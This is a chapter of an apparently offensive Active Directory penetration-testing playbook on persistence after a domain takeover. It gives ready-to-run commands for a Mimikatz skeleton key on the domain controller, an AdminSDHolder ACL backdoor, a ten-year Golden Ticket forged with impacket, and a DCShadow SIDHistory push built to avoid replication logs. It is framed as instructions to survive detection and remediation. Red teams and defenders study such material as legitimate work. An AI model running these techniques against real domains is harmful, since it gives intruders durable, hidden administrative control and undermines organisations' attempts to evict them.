---
title: "21 · Persistence Techniques"
---

# 21 · Persistence Techniques

> Skeleton Key, AdminSDHolder, Golden Ticket, DCShadow, DSRM.

!!! note "Phase overview"
    Once you have DA, plant something that survives detection and remediation. Each technique has different visibility and durability profiles. Skeleton Key is in-memory only (lost on reboot); Golden Ticket survives until krbtgt is rotated twice; AdminSDHolder is the slow-burn ACL backdoor (SDProp re-applies it every 60 minutes to all protected accounts).

### 21.1 · Skeleton Key

!!! info "Why this works / how it chains"

    Mimikatz patches LSASS on the DC so EVERY account accepts an additional master password ('mimikatz') alongside their real one. Real users can still log in normally; there's no failed-logon detection signal. Lost on reboot.

!!! warning "What leads here"
    - Have DA / shell on DC
    - Want a backdoor where any user authenticates with password 'mimikatz'
    - In-memory only which lost on DC reboot

```powershell title="Deploy + use"
# Deploy skeleton key via mimikatz on DC
.\mimikatz.exe "privilege::debug" "misc::skeleton" "exit"

# Now ANY user can authenticate with password "mimikatz"
nxc smb <DC_IP> -u administrator -p mimikatz
evil-winrm -i <DC_IP> -u administrator -p mimikatz
evil-winrm -i <DC_IP> -u any_domain_user -p mimikatz
```


### 21.2 · AdminSDHolder ACL Backdoor

!!! info "Why this works / how it chains"

    AdminSDHolder is a template ACL. Every 60 minutes (SDProp), AD copies its ACL to all 'protected' accounts (DA, EA, etc.). Add yourself to AdminSDHolder's ACL → you get access to every protected account, automatically reapplied if defenders try to remove you.

```powershell title="Plant + force SDProp"
Add-DomainObjectAcl \
  -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" \
  -PrincipalIdentity backdooruser \
  -Rights All -Verbose

# Force SDProp immediately (on DC)
$domain = [adsi]"LDAP://CN=Domain,CN=System,DC=domain,DC=local"
$domain.RunProtectAdminGroupsTask(0)
```


### 21.3 · Golden Ticket (Persistence)

!!! info "Why this works / how it chains"

    Same Golden Ticket as Phase 13.2 but with -duration 3650 (10 years). Only invalidated by rotating krbtgt TWICE (AD keeps the previous version for fallback).

```bash title="10-year Golden"
impacket-ticketer \
  -nthash <KRBTGT_HASH> \
  -domain-sid <DOMAIN_SID> \
  -domain domain.local \
  -duration 3650 \
  administrator

export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass domain.local/administrator@dc.domain.local
```


### 21.4 · DCShadow

!!! info "Why this works / how it chains"

    Register a fake DC and push attribute changes via legitimate replication. Bypasses standard logs because the changes look like normal replication. Two mimikatz instances: one as SYSTEM on DC, one in DA context.

```powershell title="Two-instance DCShadow push"
# Instance 1 (SYSTEM on DC):
.\mimikatz.exe "!processtoken" "lsadump::dcshadow /object:targetuser /attribute:sidhistory /value:S-1-5-21-XXXX-519"

# Instance 2 (DA context):
.\mimikatz.exe "lsadump::dcshadow /push"

# This pushes the SIDHistory change without standard replication logs
```


### 21.5 · DSRM Persistence (recap)

!!! info "Why this works / how it chains"

    Already covered in Phase 17. Key persistence aspect: DSRM hash survives DA password resets, password policy changes, and even krbtgt rotation. Only removed by ntdsutil.

```powershell title="Only way to remove DSRM"
# DSRM hash survives:
# - DA password resets
# - Domain password policy changes
# - krbtgt password resets (Golden Ticket invalidation)

# The ONLY way to remove is to change DSRM password on DC:
ntdsutil "set dsrm password" "reset password on server <DC>" quit quit
```

